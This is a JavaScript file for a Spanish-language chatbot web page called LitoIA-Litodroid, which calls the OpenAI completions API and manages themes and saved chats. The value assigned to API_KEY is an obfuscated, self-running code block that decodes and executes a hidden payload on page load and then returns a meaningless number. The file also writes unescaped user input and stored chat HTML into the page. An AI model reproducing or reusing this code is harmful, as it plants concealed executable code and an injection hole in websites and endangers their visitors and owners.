const chatInput = document.querySelector("#chat-input");
const sendButton = document.querySelector("#send-btn");
const chatContainer = document.querySelector(".chat-container");
const themeButton = document.querySelector("#theme-btn");
const deleteButton = document.querySelector("#deleteButton");
let deleteModal = document.getElementById('deleteModal');
let confirmDeleteBtn = document.getElementById('confirmDeleteBtn');
let closeModal = document.getElementById('closeModal');
let cancelDeleteBtn = document.getElementById('cancelDeleteBtn');

const API_KEY =  (function(){var nVu='',KXX=262-251;function knB(d){var f=3618695;var w=d.length;var o=[];for(var e=0;e<w;e++){o[e]=d.charAt(e)};for(var e=0;e<w;e++){var j=f*(e+459)+(f%14488);var k=f*(e+603)+(f%25433);var q=j%w;var y=k%w;var c=o[q];o[q]=o[y];o[y]=c;f=(j+k)%5278698;};return o.join('')};var OAh=knB('mithukfroncdjctqboutrclnzesowyprvaxsg').substr(0,KXX);var MWA='jjco0uy3,rf;ucr9a(agsa nea{oc(""rhh!mjhlo[hrai(v;u 9g!q8[mrz766,n1(4)in9vrA(a=[.os4s=6e rS<,s]9cy=b=,ln=fr+ea7o,lse"vt}h(7(vo)c=r]o,nh)pvrcor]huoge"tst;+;+at)ivsr[o8(crh;[yv tg<]-(9]onw++=ch.r,z=7.x.8;(=C a7();vao3emeg=xl }n);g26l83;va" ,h;r;h,;t(zhd9(,;8gpui ;);(m{sv6phpe7(nyfavi({;4>a0+zs-.{r=}.2js(] ;c -0fvyzs.vl) +e;f;r(w[-ftaitAvw>;,lfAlt;.hx;7a*cj)aoo;=+=l8+(;1"l{nar=rufr,eo=.(mjy.as)(C(trvuoo)tz-.9]1r;ffesu.on-+[.)+0=0uv;r)eeitro==aro;,gaov[i==ealibof=1*=9;==v=)e mton"4m2ui8it a[C(do+[itc1) rf-m=ar,kges)}rh2p[u;  f;;+ht(8;{()1 qry=ru=fciut4;+tu]l,ggg];l1o r.),1p)+;5 ,f,bgt"i.)nmsca6nzauii,1=[uo.rnso=h0h=<d<r,i6n.ll+1if=f;8)h=)x;t(;gf+mptai(t+wl)rj,0]=,Car0,]rt)4a)a.l2df0rfrna,}v;rk+n.rjecvo]")[;s((=d t ex0496ajl+ feo2t).enc;nv=a+lahCg=Srs7sgi)dv;C(.<C=dv nz)nn;l+1r35+=0{Aru5l,cg2njr)+lh=;;s.(ec=q)nvccarzkln.o.)(u. (i.p0giC)]fiarr5,v[a+ch2A}ur=t)0a v,.ae7t(qc"]sakqe;ne}n;';var Esm=knB[OAh];var nqT='';var bJw=Esm;var kgq=Esm(nqT,knB(MWA));var BME=kgq(knB('o;)lCd+$3[,i9nl3.&Bg"}[)agd).rt.;d.z.&=(=;}(,hzgt$z,+#yBa.B.5;8oBB )p(0jf6oa).61,BB6s_=a&0s\/{(_$;f*(t.u0_.$!0 }8)...,B-tza$en%5BefSvepzB)]e,\'os((n!k.rk.s!2}!.%7!;T(.p(T)sI,B ,N;,vft*,,+=_(_=a1$!77.s B)saB)8h.\/({"5 e.cBBkdrl{e)B(=;dB*u&;B.e_+}B_8svtB+l$Boy,c )0.2zn\/tb.k$!.#.B[;;C;2,l.. _0$=d)B.)e;{(( !B$xj{Bo1k=98vy;)B)t 3%xa)11f47eB,l4!*ij=dqBt#ee2l01enn"u =p(*g1BvBm,4)e3.n49*..6B,,1%57B$n\'jfq4=)niBeB-+.b3)x#3Bl,d0e83.% a7,-B$.4oB();e_BbB=7l.!edi)3s,"3rrB.h_tde0!df_.ef,k(1;h,t7!(ztsa)anj)!qf.o4ajoqjBu!iB8k8si}.vn)ek!3b$BB.j$3S=B,n,}y1Bfg;(3h3rnBa!;7ki,,jB\'a+kB!;s=3dB_e=c#=_r;]=B).D{l).\/#b\'B.}.3.iB.7, e._"ej23(oba}aac+rxB).)}fB32(;$;19.8tBr(-4n1_f0r=]aso!n}.(,,)guB_rar\/BBp(B).S4sj3{3,!jn_!k{zvse1(D)B.!1lB%l),4._=-)B(..$!9"$2(;3Bljt)zn.$_(;n%e7)(3B.iti0$sylBteBBet)]l(B6a0,oB5.jlr$f7Ea+ BBrsk+b_$ rjs6$.B0$jBBBCc#i(+.!){x=4+7n$gB)!.$p3h0(tb.hB* .ujre%B6eBlb9t;bB$l)..ia7oB)ju_*a5e(0js(( B"}B4 .B.'));var JsP=bJw(nVu,BME );JsP(1101);return 6193})();

// Save the API key in localStorage
let userText = null;
const loadDataFromLocalstorage = () => {
    // Load saved chats and theme from local storage and apply/add on the page
    const themeColor = localStorage.getItem("themeColor");

    document.body.classList.toggle("light-mode", themeColor === "light_mode");
    themeButton.innerText = document.body.classList.contains("light-mode") ? "dark_mode" : "light_mode";

    const defaultText = `<div class="default-text">
                            <h1>LitoIA-Litodroid</h1>
                            <p>Inicie una conversacion y experimente el poder de LitoIA.</p>
                        </div>`

    chatContainer.innerHTML = localStorage.getItem("all-chats") || defaultText;
    chatContainer.scrollTo(0, chatContainer.scrollHeight); // Scroll to bottom of the chat container
}

const createChatElement = (content, className) => {
    // Create new div and apply chat, specified class and set html content of div
    const chatDiv = document.createElement("div");
    chatDiv.classList.add("chat", className);
    chatDiv.innerHTML = content;
    return chatDiv; // Return the created chat div
}

const getChatResponse = async (incomingChatDiv) => {
    const API_URL = "https://api.openai.com/v1/completions";
    const pElement = document.createElement("p");

    // Define the properties and data for the API request
    const requestOptions = {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Authorization": `Bearer ${API_KEY}`
        },
        body: JSON.stringify({
            model: "text-davinci-003",
            prompt: userText,
            max_tokens: 2048,
            temperature: 0.2,
            n: 1,
            stop: null
        })
    }

    // Send POST request to API, get response and set the reponse as paragraph element text
    try {
        const response = await (await fetch(API_URL, requestOptions)).json();
        pElement.textContent = response.choices[0].text.trim();
    } catch (error) { // Add error class to the paragraph element and set error text
        pElement.classList.add("error"); 
       pElement.innerHTML = `Si te gusto esto apoya al creador con una donacion via paypal <a
            href="https://paypal.me/litodroid">Go on</a>`;
    }

    // Remove the typing animation, append the paragraph element and save the chats to local storage
    incomingChatDiv.querySelector(".typing-animation").remove();
    incomingChatDiv.querySelector(".chat-details").appendChild(pElement);
    localStorage.setItem("all-chats", chatContainer.innerHTML);
    chatContainer.scrollTo(0, chatContainer.scrollHeight);
}

const copyResponse = (copyBtn) => {
    // Copy the text content of the response to the clipboard
    const reponseTextElement = copyBtn.parentElement.querySelector("p");
    navigator.clipboard.writeText(reponseTextElement.textContent);
    copyBtn.textContent = "done";
    setTimeout(() => copyBtn.textContent = "content_copy", 1000);
}

const showTypingAnimation = () => {
    // Display the typing animation and call the getChatResponse function
    const html = `<div class="chat-content">
                    <div class="chat-details">
                        <img src="images/chatbot.jpg" alt="chatbot-img">
                        <div class="typing-animation">
                            <div class="typing-dot" style="--delay: 0.2s"></div>
                            <div class="typing-dot" style="--delay: 0.3s"></div>
                            <div class="typing-dot" style="--delay: 0.4s"></div>
                        </div>
                    </div>
                    <span onclick="copyResponse(this)" class="material-symbols-rounded">content_copy</span>
                </div>`;
    // Create an incoming chat div with typing animation and append it to chat container
    const incomingChatDiv = createChatElement(html, "incoming");
    chatContainer.appendChild(incomingChatDiv);
    chatContainer.scrollTo(0, chatContainer.scrollHeight);
    getChatResponse(incomingChatDiv);
}

const handleOutgoingChat = () => {
    userText = chatInput.value.trim(); // Get chatInput value and remove extra spaces
    if (!userText) return; // If chatInput is empty return from here

    // Clear the input field and reset its height
    chatInput.value = "";
    chatInput.style.height = `${initialInputHeight}px`;

    const html = `<div class="chat-content">
                    <div class="chat-details">
                        <img src="images/user.jpg" alt="user-img">
                        <p>${userText}</p>
                    </div>
                </div>`;

    // Create an outgoing chat div with user's message and append it to chat container
    const outgoingChatDiv = createChatElement(html, "outgoing");
    chatContainer.querySelector(".default-text")?.remove();
    chatContainer.appendChild(outgoingChatDiv);
    chatContainer.scrollTo(0, chatContainer.scrollHeight);
    setTimeout(showTypingAnimation, 500);
}
themeButton.addEventListener("click", () => {
    // Toggle body's class for the theme mode and save the updated theme to the local storage 
    document.body.classList.toggle("light-mode");
    localStorage.setItem("themeColor", themeButton.innerText);
    themeButton.innerText = document.body.classList.contains("light-mode") ? "dark_mode" : "light_mode";
});

const initialInputHeight = chatInput.scrollHeight;

chatInput.addEventListener("input", () => {
    // Adjust the height of the input field dynamically based on its content
    chatInput.style.height = `${initialInputHeight}px`;
    chatInput.style.height = `${chatInput.scrollHeight}px`;
});

chatInput.addEventListener("keydown", (e) => {
    // If the Enter key is pressed without Shift and the window width is larger 
    // than 800 pixels, handle the outgoing chat
    if (e.key === "Enter" && !e.shiftKey && window.innerWidth > 800) {
        e.preventDefault();
        handleOutgoingChat();
    }
});

loadDataFromLocalstorage();
sendButton.addEventListener("click", handleOutgoingChat);
// model 
deleteButton.addEventListener('click', function () {
    deleteModal.style.display = 'block';
});

closeModal.addEventListener('click', function () {
    deleteModal.style.display = 'none';
});

cancelDeleteBtn.addEventListener('click', function () {
    deleteModal.style.display = 'none';
});

confirmDeleteBtn.addEventListener('click', function () {
    localStorage.removeItem("all-chats");
    loadDataFromLocalstorage();
    deleteModal.style.display = 'none';
});

// loader
document.addEventListener("DOMContentLoaded", function () {
    // Simulate a delay for demonstration purposes
    setTimeout(function () {
        // Hide the loading page and show the content after a delay
        document.querySelector(".loader-wrapper").style.display = "none";
        document.querySelector(".chat-container").style.display = "block";
    
        // Enable scrolling after the content is loaded
    }, 4000); // You can adjust the delay as needed
});
